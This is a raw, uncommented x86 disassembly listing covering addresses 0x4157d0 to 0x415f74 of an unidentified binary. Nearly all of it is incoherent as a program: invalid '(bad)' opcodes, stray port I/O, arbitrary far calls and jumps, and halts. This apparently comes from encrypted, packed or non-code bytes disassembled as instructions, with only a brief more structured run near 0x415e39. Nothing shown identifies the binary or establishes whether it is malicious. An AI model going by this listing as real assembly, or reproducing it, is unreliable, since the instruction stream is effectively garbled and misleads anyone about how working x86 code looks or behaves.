  4157d0:	loop   0x41581f
  4157d2:	push   ecx
  4157d3:	div    DWORD PTR [eax+0x6b]
  4157d6:	cs mov ebx,eax
  4157d9:	push   es
  4157da:	mov    esi,0xd33ce3d0
  4157df:	mov    edi,0x5132e2b7
  4157e4:	in     al,dx
  4157e5:	or     ecx,DWORD PTR [ebx]
  4157e7:	bound  edx,QWORD PTR [edx+0x50]
  4157ea:	mov    al,0xce
  4157ec:	pop    esi
  4157ed:	daa    
  4157ee:	shl    DWORD PTR cs:[edi],1
  4157f1:	retf   0x93ea
  4157f4:	inc    esp
  4157f5:	sbb    edi,DWORD PTR [ebp+0x46]
  4157f8:	data16 xor ch,ah
  4157fb:	call   0x9a4f:0xa29c9422
  415802:	scas   al,BYTE PTR es:[edi]
  415803:	inc    edx
  415804:	xor    BYTE PTR [eax+0x30],ah
  415807:	mov    dl,ah
  415809:	and    eax,0xa4b41aad
  41580e:	sbb    edi,eax
  415810:	sub    BYTE PTR [ebx],dh
  415812:	xor    eax,0xf275344b
  415817:	std    
  415818:	xchg   DWORD PTR [edi+0x1a],esp
  41581b:	sar    BYTE PTR ss:[ebx],1
  41581e:	mov    WORD PTR [edi-0x46ce8900],gs
  415824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415825:	jp     0x415863
  415827:	lds    eax,FWORD PTR [eax-0x34]
  41582a:	inc    esp
  41582b:	aas    
  41582c:	jno    0x4157f8
  41582e:	div    DWORD PTR [ebx]
  415830:	je     0x4157e2
  415832:	out    0x40,eax
  415834:	rcr    DWORD PTR [esi+0x48],cl
  415837:	in     eax,dx
  415838:	outs   dx,DWORD PTR ds:[esi]
  415839:	dec    esp
  41583a:	sbb    eax,0x79632497
  41583f:	pop    ds
  415840:	cld    
  415841:	add    ebp,DWORD PTR [ebx+ebp*8-0x34]
  415845:	sub    BYTE PTR [ebx+ecx*8-0x61474a9f],ch
  41584c:	inc    esp
  41584d:	push   ecx
  41584e:	sar    BYTE PTR [edi],0xc3
  415851:	jl     0x415832
  415853:	mov    bh,0x1e
  415855:	test   BYTE PTR [ebp-0x11],0x67
  415859:	ja     0x4158d5
  41585b:	sbb    bl,dh
  41585d:	jne    0x41589d
  41585f:	push   eax
  415860:	ret    
  415861:	dec    di
  415863:	repnz (bad) 
  415865:	rcl    DWORD PTR [ecx+0x79],cl
  415868:	adc    bh,bh
  41586a:	add    ah,BYTE PTR [edx]
  41586c:	or     eax,0xc2be37dd
  415871:	mov    ebx,0x9a6a5011
  415876:	std    
  415877:	xchg   edx,eax
  415878:	je     0x4158dc
  41587a:	xchg   edx,eax
  41587b:	mov    ebp,0x3bae2ff4
  415880:	int    0x16
  415882:	push   0x8b992671
  415887:	push   ebx
  415888:	in     al,dx
  415889:	push   0x2abdd936
  41588e:	iret   
  41588f:	jmp    0x4158f8
  415891:	mov    ds:0x4b3f4b8e,al
  415896:	mov    dh,0x4f
  415898:	ret    0x3591
  41589b:	aaa    
  41589c:	outs   dx,DWORD PTR ds:[esi]
  41589d:	inc    esi
  41589e:	imul   BYTE PTR [esi]
  4158a0:	add    al,0xbb
  4158a2:	pusha  
  4158a3:	mov    ecx,DWORD PTR cs:[eax]
  4158a6:	ret    0x5f6a
  4158a9:	sti    
  4158aa:	cld    
  4158ab:	leave  
  4158ac:	scas   al,BYTE PTR es:[edi]
  4158ad:	retf   0x54a9
  4158b0:	cdq    
  4158b1:	jb     0x41591b
  4158b3:	sub    BYTE PTR [ebx+ebx*2-0x124f4dab],dl
  4158ba:	and    DWORD PTR [edi],ecx
  4158bc:	hlt    
  4158bd:	in     eax,dx
  4158be:	push   es
  4158bf:	mov    es:0xadaa3686,al
  4158c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c6:	and    DWORD PTR [eax+0x5],eax
  4158c9:	push   ss
  4158ca:	mov    al,0x23
  4158cc:	and    DWORD PTR [edi+0x74010b14],ebx
  4158d2:	mov    dh,0xf7
  4158d4:	add    cl,BYTE PTR [edi-0x20a894e1]
  4158da:	cmp    DWORD PTR [edx-0x27],0x979ad341
  4158e1:	sub    esp,ebx
  4158e3:	(bad)  
  4158e4:	int    0x9e
  4158e6:	inc    DWORD PTR [esp+ebx*2+0x53]
  4158ea:	cli    
  4158eb:	inc    eax
  4158ec:	xor    DWORD PTR [esi+0x35],eax
  4158ef:	cmp    DWORD PTR [edi-0x13],esp
  4158f2:	dec    esi
  4158f3:	xor    ah,ah
  4158f5:	sti    
  4158f6:	mov    ch,0xe
  4158f8:	test   DWORD PTR [edi-0x64],esi
  4158fb:	xchg   edi,eax
  4158fc:	sbb    eax,0x1becada1
  415901:	xchg   ecx,esi
  415903:	ret    
  415904:	(bad)  
  415905:	cmc    
  415906:	xor    dh,BYTE PTR [ecx+0x6]
  415909:	ret    
  41590a:	ins    BYTE PTR es:[edi],dx
  41590b:	cmc    
  41590c:	in     eax,dx
  41590d:	(bad)  
  415911:	call   0x416:0xfeda903f
  415918:	dec    ecx
  415919:	cmc    
  41591a:	or     al,0x9d
  41591c:	fwait
  41591d:	stc    
  41591e:	ret    
  41591f:	pop    esp
  415920:	inc    esp
  415921:	inc    edi
  415922:	dec    esp
  415923:	dec    eax
  415924:	aam    0x39
  415926:	(bad)  
  415928:	in     eax,dx
  415929:	mov    al,0xc3
  41592b:	cs cdq 
  41592d:	dec    esi
  41592e:	repz fwait
  415930:	sbb    eax,DWORD PTR [edi+0x10]
  415933:	push   edi
  415934:	out    dx,eax
  415935:	sbb    bl,0xd4
  415938:	out    0xca,al
  41593a:	test   al,0xaf
  41593c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593d:	not    BYTE PTR [ecx+edi*2]
  415940:	mov    esi,0x1e68c5ef
  415945:	retf   0xadad
  415948:	in     eax,dx
  415949:	xor    al,0x8e
  41594b:	pop    ebp
  41594c:	jmp    0x415918
  41594e:	mov    ch,0xf8
  415950:	jne    0x415914
  415952:	push   0xffffffac
  415954:	pop    edi
  415955:	out    dx,eax
  415956:	sub    al,0x44
  415958:	je     0x4159b2
  41595a:	cmp    eax,0x9a32db37
  41595f:	sub    dh,bh
  415961:	fcompp 
  415963:	xor    DWORD PTR [eax+0x36],ebp
  415966:	sub    eax,0xd64b5309
  41596b:	xchg   edx,eax
  41596c:	cmp    bl,BYTE PTR ds:0xfb7df3dd
  415972:	test   BYTE PTR [ebp+0xd19b13b],0x48
  415979:	fwait
  41597a:	dec    edx
  41597b:	push   0xffffffdc
  41597d:	popa   
  41597e:	xor    BYTE PTR [ebp+0x6ec0838e],ah
  415984:	cmp    edi,esi
  415986:	dec    esp
  415987:	scas   al,BYTE PTR es:[edi]
  415988:	cmp    al,0x66
  41598a:	jno    0x415984
  41598c:	js     0x4159fb
  41598e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41598f:	mov    esp,0x6c28cd2d
  415994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415995:	push   eax
  415996:	or     ch,ah
  415998:	mov    ecx,0x507d216d
  41599d:	sbb    eax,0xa1bfa76b
  4159a2:	dec    edx
  4159a3:	pusha  
  4159a4:	in     al,dx
  4159a5:	fst    st(6)
  4159a7:	in     al,dx
  4159a8:	es stos DWORD PTR es:[edi],eax
  4159aa:	aam    0xb2
  4159ac:	aaa    
  4159ad:	pusha  
  4159ae:	ror    DWORD PTR [ebx-0x3919ec00],0xa7
  4159b5:	pop    ds
  4159b6:	cmp    eax,0x372bae5d
  4159bb:	jl     0x4159f1
  4159bd:	ss inc esp
  4159bf:	and    ah,BYTE PTR [edi+eax*1+0xf]
  4159c3:	sbb    eax,DWORD PTR [eax+0x48]
  4159c6:	cmp    eax,0x69502496
  4159cb:	in     eax,dx
  4159cc:	(bad)  
  4159cd:	(bad)  
  4159ce:	std    
  4159cf:	jae    0x415963
  4159d1:	mov    ch,0x2a
  4159d3:	popf   
  4159d4:	or     bl,BYTE PTR [ecx+0x4b954fe8]
  4159da:	in     al,dx
  4159db:	pushf  
  4159dc:	xor    BYTE PTR [edx+ecx*1+0x71dbb932],dl
  4159e3:	int3   
  4159e4:	sub    al,0xcf
  4159e6:	fdiv   QWORD PTR [eax]
  4159e8:	fistp  WORD PTR [esi+ecx*4-0x32]
  4159ec:	inc    edi
  4159ed:	into   
  4159ee:	ret    0x8e1d
  4159f1:	(bad)  
  4159f3:	sub    esp,DWORD PTR [edi]
  4159f5:	(bad)  
  4159f6:	(bad)  
  4159f8:	cli    
  4159f9:	push   esi
  4159fa:	push   ebp
  4159fb:	mov    ebp,0xe2bbf809
  415a00:	and    al,0xb7
  415a02:	(bad)
  415a06:	and    BYTE PTR [edi],al
  415a08:	sbb    DWORD PTR [esi],ebx
  415a0a:	ret    0x9de
  415a0d:	leave  
  415a0e:	shl    BYTE PTR [edi-0x68],cl
  415a11:	adc    DWORD PTR [edi+0x3f523530],edx
  415a17:	(bad)  
  415a18:	out    0x6f,eax
  415a1a:	cmp    esp,DWORD PTR [ecx+eax*8+0x1e82d52a]
  415a21:	sub    eax,0x66b97963
  415a26:	int    0x68
  415a28:	inc    esp
  415a29:	push   eax
  415a2a:	cmc    
  415a2b:	and    DWORD PTR [edi],edx
  415a2d:	jecxz  0x415a75
  415a2f:	add    al,0xcd
  415a31:	repnz xchg ecx,eax
  415a33:	adc    ch,BYTE PTR [ecx+0x3ee785e9]
  415a39:	xchg   ecx,eax
  415a3a:	(bad)  
  415a3b:	and    edx,DWORD PTR [ecx-0x4e5b14ec]
  415a41:	or     eax,0xfb58d129
  415a46:	adc    BYTE PTR [ebp+0x7f],ch
  415a49:	mov    BYTE PTR [ebp-0x7bf59484],al
  415a4f:	aad    0x24
  415a51:	xchg   ebx,eax
  415a52:	jmp    0xba1c:0x5415d54f
  415a59:	rol    bh,cl
  415a5b:	(bad)  
  415a5c:	fldenv [ecx+0x40]
  415a5f:	push   cs
  415a60:	call   0xfc05:0x8ee4a38
  415a67:	jl     0x415ad3
  415a69:	and    bp,WORD PTR [eax-0x4e]
  415a6d:	sbb    eax,DWORD PTR ss:[eax-0x4f]
  415a71:	or     BYTE PTR [eax-0x13],0x5c
  415a75:	popf   
  415a76:	mov    edi,0xf218ae
  415a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a7c:	adc    al,0x3f
  415a7e:	stc    
  415a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a80:	inc    ebp
  415a81:	ins    DWORD PTR es:[edi],dx
  415a82:	dec    edi
  415a83:	sahf   
  415a84:	(bad)  
  415a85:	lock test al,0xd5
  415a88:	inc    esi
  415a89:	xchg   esi,eax
  415a8a:	mul    bh
  415a8c:	ins    BYTE PTR es:[edi],dx
  415a8d:	pop    ds
  415a8e:	ins    BYTE PTR es:[edi],dx
  415a8f:	push   ss
  415a90:	add    esi,DWORD PTR [ecx-0x3]
  415a93:	xlat   BYTE PTR ds:[ebx]
  415a94:	test   BYTE PTR [edi],al
  415a96:	inc    ebp
  415a97:	sbb    eax,0x22c4b67e
  415a9c:	jmp    FWORD PTR [ecx+ebp*1]
  415a9f:	mov    gs:0xbb352057,al
  415aa5:	adc    DWORD PTR [esp+0x5cf132ae],ebx
  415aac:	aas    
  415aad:	or     eax,0xf13a2ce8
  415ab2:	xchg   edx,eax
  415ab3:	pop    ebp
  415ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab5:	adc    eax,0x2240b69f
  415aba:	push   0xffffffda
  415abc:	dec    esi
  415abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415abe:	in     eax,0xae
  415ac0:	mov    ebp,0x2c90235c
  415ac5:	xlat   BYTE PTR ds:[ebx]
  415ac6:	mov    ds:0xca3c2143,eax
  415acb:	jns    0x415a55
  415acd:	dec    ecx
  415ace:	sbb    bh,BYTE PTR [esp+ebp*2]
  415ad1:	nop
  415ad2:	dec    edi
  415ad3:	mov    ds:0xbc0f3522,al
  415ad8:	sbb    DWORD PTR [edi+ebx*1-0x721e7fbe],esi
  415adf:	mov    ebx,DWORD PTR [esi]
  415ae1:	mov    dl,BYTE PTR [ecx+0x187642cb]
  415ae7:	cdq    
  415ae8:	jle    0x415b3e
  415aea:	mov    bh,0xc6
  415aec:	sbb    eax,0x28666f80
  415af1:	stos   BYTE PTR es:[edi],al
  415af2:	pushf  
  415af3:	and    eax,0x8c13340
  415af8:	push   ebp
  415af9:	test   BYTE PTR [edx+ecx*4+0x14],bl
  415afd:	adc    al,0x21
  415aff:	or     al,0xb9
  415b01:	xor    esp,DWORD PTR [eax+eax*8+0x351f50a2]
  415b08:	xor    edi,DWORD PTR [ebp-0x1313378d]
  415b0e:	xchg   edi,eax
  415b0f:	cmp    BYTE PTR [ebp+0x4286871],0x2d
  415b16:	add    DWORD PTR [ebx],edi
  415b18:	cli    
  415b19:	mov    edx,0xdcf7f6fb
  415b1e:	mov    esp,0xc2c66cce
  415b23:	jg     0x415b35
  415b25:	mov    esp,0xd597252f
  415b2a:	call   0x7c3e:0x7df0ac02
  415b31:	test   BYTE PTR [edi+0x181a2ce7],ch
  415b37:	jle    0x415b49
  415b39:	push   ecx
  415b3a:	mov    bl,0x4e
  415b3c:	and    BYTE PTR [edx],cl
  415b3e:	jg     0x415af6
  415b40:	(bad)  
  415b41:	fsubp  st(3),st
  415b43:	sbb    eax,0xb85efbe8
  415b48:	je     0x415bbc
  415b4a:	pop    ss
  415b4b:	inc    ebp
  415b4c:	xchg   ecx,eax
  415b4d:	imul   edx,esi,0x38
  415b50:	mov    ebx,0x8a3d368c
  415b55:	ja     0x415b2e
  415b57:	in     eax,0xe8
  415b59:	adc    DWORD PTR [edi],0x6943e8de
  415b5f:	test   al,0x6c
  415b61:	xor    eax,0x31244c13
  415b66:	push   eax
  415b67:	mov    ch,0xd5
  415b69:	fbld   TBYTE PTR [esi+0x364992e9]
  415b6f:	and    DWORD PTR [ecx+0x26],ebp
  415b72:	scas   eax,DWORD PTR es:[edi]
  415b73:	sbb    eax,0x2fca9ff3
  415b78:	xor    al,0x6d
  415b7b:	mov    al,ds:0x34751f8c
  415b80:	jo     0x415b30
  415b82:	fldenv ds:0x65086e6
  415b88:	jns    0x415bcf
  415b8a:	mov    al,0xa1
  415b8c:	xchg   esp,eax
  415b8d:	(bad)  
  415b8e:	adc    ch,BYTE PTR [edi-0x41228e63]
  415b94:	(bad)  
  415b95:	push   0xca28c07e
  415b9a:	data16 out 0x68,al
  415b9d:	pop    esi
  415b9e:	push   eax
  415b9f:	aaa    
  415ba0:	es js  0x415b98
  415ba3:	push   cs
  415ba4:	dec    edi
  415ba5:	jmp    0x415ba1
  415ba7:	ins    DWORD PTR es:[edi],dx
  415ba8:	pop    edi
  415ba9:	adc    ah,ch
  415bab:	pop    ebp
  415bac:	fsub   QWORD PTR ds:0x727b3bee
  415bb2:	aas    
  415bb3:	neg    BYTE PTR [edi]
  415bb5:	jl     0x415b60
  415bb7:	mov    al,ds:0x1dde037c
  415bbc:	adc    bl,ch
  415bbe:	fdiv   DWORD PTR ds:0x1a600d90
  415bc4:	mov    bh,0x1
  415bc6:	mov    bh,0x10
  415bc8:	(bad)  
  415bc9:	xchg   ebp,eax
  415bca:	push   ebp
  415bcb:	jge    0x415b7e
  415bcd:	mov    bl,0x51
  415bcf:	adc    ah,BYTE PTR [esi-0x63]
  415bd2:	lds    esp,FWORD PTR [edi-0x26]
  415bd5:	dec    eax
  415bd6:	xor    dh,BYTE PTR [eax]
  415bd8:	pop    esi
  415bd9:	scas   al,BYTE PTR es:[edi]
  415bda:	fimul  DWORD PTR [esi-0x58]
  415bdd:	loope  0x415c41
  415bdf:	and    al,BYTE PTR [ecx+eiz*8-0x2b]
  415be3:	lea    edx,[eax]
  415be5:	sahf   
  415be6:	mov    ds:0x7fe8e04,eax
  415beb:	jecxz  0x415bdf
  415bed:	scas   eax,DWORD PTR es:[edi]
  415bee:	mov    esi,0x981f9f37
  415bf3:	mov    ds:0xfed6b34b,al
  415bf8:	mov    BYTE PTR [esp+ebx*4],ah
  415bfb:	sbb    cl,cl
  415bfd:	mov    bl,0xa
  415bff:	add    DWORD PTR [ecx],eax
  415c01:	mov    al,0x8d
  415c03:	popf   
  415c04:	out    0x40,al
  415c06:	cmp    ah,cl
  415c08:	push   cs
  415c09:	popa   
  415c0a:	dec    ebx
  415c0b:	push   cs
  415c0c:	ds or  cl,0x18
  415c10:	clc    
  415c11:	add    al,0x96
  415c13:	dec    esi
  415c14:	xchg   DWORD PTR [eax],edi
  415c16:	test   esp,0xabf30927
  415c1c:	dec    ebx
  415c1d:	pushf  
  415c1e:	es xchg esi,eax
  415c20:	in     al,dx
  415c21:	xchg   ebp,eax
  415c22:	lea    edx,[ebp-0x506387d0]
  415c28:	(bad)  
  415c2a:	add    esi,ecx
  415c2c:	and    eax,0xcd2b022b
  415c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c32:	ins    DWORD PTR es:[edi],dx
  415c33:	(bad)  [eax]
  415c35:	mov    esp,0x28c7dcf8
  415c3a:	imul   esi,DWORD PTR [ecx],0x38
  415c3d:	xchg   DWORD PTR [edi+0x65c736f],ebp
  415c43:	dec    eax
  415c44:	stos   DWORD PTR es:[edi],eax
  415c45:	ror    DWORD PTR [esi+0x413615ae],1
  415c4b:	mov    bh,0x14
  415c4d:	add    al,0x3f
  415c4f:	mov    ebx,0x702b48f3
  415c54:	pop    eax
  415c55:	fimul  WORD PTR [ebp-0x728776d0]
  415c5b:	mov    WORD PTR [ebp+0x51bae233],es
  415c61:	inc    ecx
  415c62:	out    0x31,eax
  415c64:	pop    es
  415c65:	add    eax,0xacf3e898
  415c6a:	mov    bh,cl
  415c6c:	das    
  415c6d:	and    BYTE PTR [edx],dl
  415c6f:	and    DWORD PTR [eax],eax
  415c71:	ss je  0x415c05
  415c74:	cwde   
  415c75:	into   
  415c76:	cld    
  415c77:	jmp    0x415cf1
  415c79:	pop    edi
  415c7a:	sub    DWORD PTR [edx-0x69],esp
  415c7d:	aaa    
  415c7e:	aad    0x5
  415c80:	jns    0x415c0d
  415c82:	jle    0x415cd9
  415c84:	call   0x85a3a53e
  415c89:	scas   al,BYTE PTR es:[edi]
  415c8a:	mov    ch,BYTE PTR [edx]
  415c8c:	jp     0x415ca4
  415c8e:	loope  0x415c2b
  415c90:	push   ebx
  415c91:	xchg   ecx,eax
  415c92:	push   edi
  415c93:	cmp    DWORD PTR [esi-0x4],ebx
  415c96:	sbb    esi,ebx
  415c98:	jmp    0x415c6c
  415c9a:	inc    ecx
  415c9b:	xor    DWORD PTR [edx],esp
  415c9d:	mov    DWORD PTR [ebx-0xf],esp
  415ca0:	(bad)  
  415ca1:	sbb    eax,0x77827a3c
  415ca6:	mov    ebp,0x524326ec
  415cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cac:	pop    esp
  415cad:	imul   ebx,DWORD PTR [ecx-0x18],0xffffffbf
  415cb1:	cdq    
  415cb2:	xor    al,0x6a
  415cb4:	fiadd  DWORD PTR [ecx-0x292cbd9c]
  415cba:	push   ecx
  415cbb:	xchg   esp,eax
  415cbc:	pop    ebx
  415cbd:	arpl   WORD PTR [edi+0x7f],bp
  415cc0:	pop    esp
  415cc1:	xor    eax,0xd5265e4e
  415cc6:	mov    ds:0x88c0a8ea,al
  415ccb:	mov    esp,0xe053bd69
  415cd0:	out    dx,eax
  415cd1:	mov    cs,WORD PTR [ebx]
  415cd3:	sbb    edi,DWORD PTR [edx-0x54]
  415cd6:	mov    al,0x63
  415cd8:	dec    ebp
  415cd9:	jg     0x415ce6
  415cdb:	je     0x415d12
  415cdd:	jmp    0x869b:0x752d4787
  415ce4:	sub    ch,ah
  415ce6:	add    DWORD PTR [esi+ecx*8],edx
  415ce9:	sbb    eax,0xdb0d0f00
  415cee:	mov    edi,0xf1c7e688
  415cf3:	(bad)  
  415cf5:	test   eax,0x5ad8750a
  415cfa:	stc    
  415cfb:	outs   dx,DWORD PTR cs:[esi]
  415cfd:	icebp  
  415cfe:	inc    eax
  415cff:	mov    dl,0x15
  415d01:	sub    edi,DWORD PTR [ebp-0x4f]
  415d04:	ins    BYTE PTR es:[edi],dx
  415d05:	ins    BYTE PTR es:[edi],dx
  415d06:	mov    esp,0x66ca9034
  415d0b:	inc    edi
  415d0c:	aad    0xcb
  415d0e:	inc    ebx
  415d0f:	fisubr DWORD PTR [ebp-0x766e5038]
  415d15:	push   cs
  415d16:	cwde   
  415d17:	jecxz  0x415cbb
  415d19:	push   cs
  415d1a:	ror    DWORD PTR [ebp-0x1c7d59d2],cl
  415d20:	js     0x415d9f
  415d22:	or     BYTE PTR [edx+edx*8+0x5e156ff2],dh
  415d29:	inc    esi
  415d2a:	cld    
  415d2b:	mov    eax,0x114769e3
  415d30:	rol    DWORD PTR [esi],cl
  415d32:	int3   
  415d33:	scas   al,BYTE PTR es:[edi]
  415d34:	retf   0x8cf9
  415d37:	adc    eax,0x89c74faf
  415d3c:	push   0x60e8335b
  415d41:	(bad)  
  415d42:	mov    edi,0x47da0a60
  415d47:	xor    BYTE PTR [eax+0x5dbdba05],dh
  415d4d:	(bad)  
  415d4e:	std    
  415d4f:	pop    eax
  415d50:	inc    eax
  415d51:	push   esi
  415d52:	or     al,0xc6
  415d54:	xchg   BYTE PTR [eax],cl
  415d56:	ret    
  415d57:	sbb    ecx,DWORD PTR [eax+0x3ac10908]
  415d5d:	fist   WORD PTR [eax+eax*8-0x2c1f1dba]
  415d64:	mov    ?,WORD PTR [edi]
  415d66:	pop    ds
  415d67:	and    DWORD PTR [esp+edi*2-0x6382bf78],edi
  415d6e:	mov    ds:0x71f7c825,al
  415d73:	call   0x6b11:0xc641d57a
  415d7a:	sbb    eax,0x79448f79
  415d7f:	sub    DWORD PTR [ebx],ebp
  415d81:	in     eax,0x81
  415d83:	dec    ebp
  415d84:	jo     0x415dd6
  415d86:	nop
  415d87:	dec    esi
  415d88:	mov    dh,0xff
  415d8a:	repnz aam 0x5
  415d8d:	int3   
  415d8e:	call   0x20cd:0x8f0ba089
  415d95:	push   ds
  415d96:	or     al,bl
  415d98:	dec    ebp
  415d99:	cli    
  415d9a:	sub    BYTE PTR [edi-0x7],bl
  415d9d:	xor    al,BYTE PTR [edx]
  415d9f:	add    eax,0x171c5565
  415da4:	test   bh,bl
  415da6:	arpl   WORD PTR [eax-0x753a5e87],cx
  415dac:	xor    al,0xc3
  415dae:	hlt    
  415daf:	xor    BYTE PTR [ecx+0x656e807d],bh
  415db5:	push   ecx
  415db6:	xor    edi,DWORD PTR [ebx-0x63]
  415db9:	fist   WORD PTR [ecx-0x7f]
  415dbc:	mov    ch,0x27
  415dbe:	aas    
  415dbf:	fistp  DWORD PTR [esi]
  415dc1:	jge    0x415dce
  415dc3:	xchg   BYTE PTR [ecx+0x2b],dh
  415dc6:	fadd   QWORD PTR [ecx]
  415dc8:	and    esp,DWORD PTR [eax]
  415dca:	pushf  
  415dcb:	addr16 jo 0x415d51
  415dce:	loopne 0x415daa
  415dd0:	mov    bh,0xc8
  415dd2:	(bad)  
  415dd3:	sub    eax,0x3cf80747
  415dd8:	imul   esp,eax,0xffffffc7
  415ddb:	sti    
  415ddc:	mov    ebx,0xb4706612
  415de1:	shr    BYTE PTR [ecx+0x75314448],0xb8
  415de8:	(bad)  
  415de9:	xchg   ecx,eax
  415dea:	out    0xbb,al
  415dec:	cmp    al,0x20
  415dee:	and    ebx,ebx
  415df0:	xchg   ebx,eax
  415df1:	jl     0x415db7
  415df3:	mov    DWORD PTR [esi],ecx
  415df5:	cwde   
  415df6:	daa    
  415df7:	retf   0x204
  415dfa:	and    ebp,esi
  415dfc:	push   esi
  415dfd:	pop    ecx
  415dfe:	inc    ebp
  415dff:	sub    ecx,ecx
  415e01:	mov    ebp,0x15a64196
  415e06:	and    eax,0x11936160
  415e0b:	std    
  415e0c:	nop
  415e0d:	add    DWORD PTR [ecx+0x72],ebx
  415e10:	nop
  415e11:	pop    esi
  415e12:	call   0xa7995baa
  415e17:	scas   al,BYTE PTR es:[edi]
  415e18:	aad    0x8c
  415e1a:	inc    edx
  415e1b:	sbb    al,0xb3
  415e1d:	pop    ebx
  415e1e:	cmp    ecx,DWORD PTR [ebp+0x7a]
  415e21:	bound  edx,QWORD PTR [edx+0x632f0012]
  415e27:	mov    edi,0x16bda981
  415e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e2d:	dec    ebx
  415e2e:	call   DWORD PTR [ebx]
  415e30:	cmp    DWORD PTR [ebp+0x10],esi
  415e33:	je     0x4181ea
  415e39:	xchg   edx,eax
  415e3a:	push   0xc
  415e3c:	pop    ecx
  415e3d:	dec    ecx
  415e3e:	push   0x3
  415e40:	pop    ebx
  415e41:	inc    ebx
  415e42:	xchg   ebx,ecx
  415e44:	inc    ecx
  415e45:	sub    ebx,ecx
  415e47:	xchg   ebx,ecx
  415e49:	jmp    0x4181df
  415e4e:	mov    ebx,0x745f6f40
  415e53:	je     0x415e20
  415e55:	fs inc ebx
  415e57:	stc    
  415e58:	cmp    al,0xd7
  415e5a:	(bad)  
  415e5b:	stos   DWORD PTR es:[edi],eax
  415e5c:	push   es
  415e5d:	adc    eax,0x7b7ab5d8
  415e62:	repnz cwde 
  415e64:	jnp    0x415ee1
  415e66:	cmp    DWORD PTR [edi+ebx*1-0x3e],esp
  415e6a:	push   esp
  415e6b:	and    al,0x97
  415e6d:	sbb    eax,DWORD PTR [esi]
  415e6f:	mov    eax,0xe93855d6
  415e74:	pop    esp
  415e75:	pop    eax
  415e76:	sbb    BYTE PTR [ecx+esi*1-0x65],0xe1
  415e7b:	jecxz  0x415e00
  415e7d:	pop    esi
  415e7e:	and    eax,0xf9146511
  415e83:	mov    dh,0xdf
  415e85:	add    eax,0x4f61a64c
  415e8a:	lock or ch,BYTE PTR [ecx]
  415e8d:	push   ds
  415e8e:	aam    0x46
  415e90:	adc    ch,BYTE PTR [ecx+0x7b]
  415e93:	scas   al,BYTE PTR es:[edi]
  415e94:	cld    
  415e95:	shl    cl,1
  415e97:	adc    al,0x9b
  415e99:	out    0xe2,eax
  415e9b:	mov    bh,0xc0
  415e9d:	add    DWORD PTR [ecx*1+0x418a6456],0xffffffe8
  415ea5:	adc    ecx,edx
  415ea7:	ret    
  415ea8:	add    ebp,DWORD PTR [ebx-0x35]
  415eab:	cmp    al,0xdb
  415ead:	in     al,dx
  415eae:	jbe    0x415ebd
  415eb0:	ss pop esp
  415eb2:	push   0x37
  415eb4:	gs xchg edx,eax
  415eb6:	retf   0xa67c
  415eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eba:	push   edi
  415ebb:	and    eax,0x2e1a8b35
  415ec0:	imul   edi,DWORD PTR [eax+0x46],0xfe657e5d
  415ec7:	jo     0x415edd
  415ec9:	aam    0x85
  415ecb:	mov    ebx,0xeda0e7e9
  415ed0:	pop    edx
  415ed1:	xor    bl,BYTE PTR [edi]
  415ed3:	pushw  ss
  415ed5:	cmc    
  415ed6:	cli    
  415ed7:	(bad)  
  415ed8:	sti    
  415ed9:	jle    0x415ef6
  415edb:	fmulp  st(6),st
  415edd:	jecxz  0x415ee0
  415edf:	fsub   DWORD PTR [edi*4+0x30830fd5]
  415ee6:	pop    es
  415ee7:	push   ss
  415ee8:	cmp    DWORD PTR [esp+edx*8-0x30358844],ecx
  415eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef0:	scas   al,BYTE PTR es:[edi]
  415ef1:	aas    
  415ef2:	shr    ebx,1
  415ef4:	lods   eax,DWORD PTR ds:[esi]
  415ef5:	ja     0x415e83
  415ef7:	dec    ecx
  415ef8:	int3   
  415ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415efa:	hlt    
  415efb:	loopne 0x415e96
  415efd:	jle    0x415f08
  415eff:	adc    BYTE PTR [ecx-0x2f],cl
  415f02:	fimul  DWORD PTR [ebp+0x55]
  415f05:	ins    BYTE PTR es:[edi],dx
  415f06:	dec    ebp
  415f07:	iret   
  415f08:	sti    
  415f09:	push   ds
  415f0a:	inc    ebp
  415f0b:	lea    eax,[edx]
  415f0d:	test   BYTE PTR [ebp-0x4a],bh
  415f10:	in     al,0x94
  415f12:	lods   al,BYTE PTR ds:[esi]
  415f13:	pushf  
  415f14:	add    DWORD PTR [ecx+0x3c],0xb30d28c6
  415f1b:	inc    edx
  415f1c:	(bad)  
  415f1d:	sbb    al,0x38
  415f1f:	(bad)  
  415f20:	jmp    0xfb25:0x4ddf2b45
  415f27:	cli    
  415f28:	xchg   esp,eax
  415f29:	fmul   DWORD PTR [esp+ecx*8]
  415f2c:	sbb    eax,0x166a8ad7
  415f31:	aas    
  415f32:	dec    ebp
  415f33:	sbb    DWORD PTR [ebp-0x23dcc74a],ebx
  415f39:	dec    eax
  415f3a:	pushf  
  415f3b:	ins    DWORD PTR es:[edi],dx
  415f3c:	ins    DWORD PTR es:[edi],dx
  415f3d:	push   edi
  415f3e:	mov    esi,0xd9031489
  415f43:	repnz loop 0x415efe
  415f46:	nop
  415f47:	(bad)  
  415f48:	jno    0x415eca
  415f4a:	mov    eax,0x34c4f09
  415f4f:	outs   dx,BYTE PTR ds:[esi]
  415f50:	and    al,0x2f
  415f52:	dec    esi
  415f53:	loop   0x415f3d
  415f55:	add    dh,BYTE PTR [edx]
  415f57:	jge    0x415fc3
  415f59:	mov    cl,ah
  415f5b:	rcr    DWORD PTR [eax],0xe5
  415f5e:	push   eax
  415f5f:	sub    BYTE PTR [ebx-0x3433b28e],0xff
  415f66:	inc    BYTE PTR [edi-0x277674c]
  415f6c:	cmp    bl,0xd1
  415f6f:	call   0xb044c8e2
  415f74:	mov    ebx,0x568dcd78
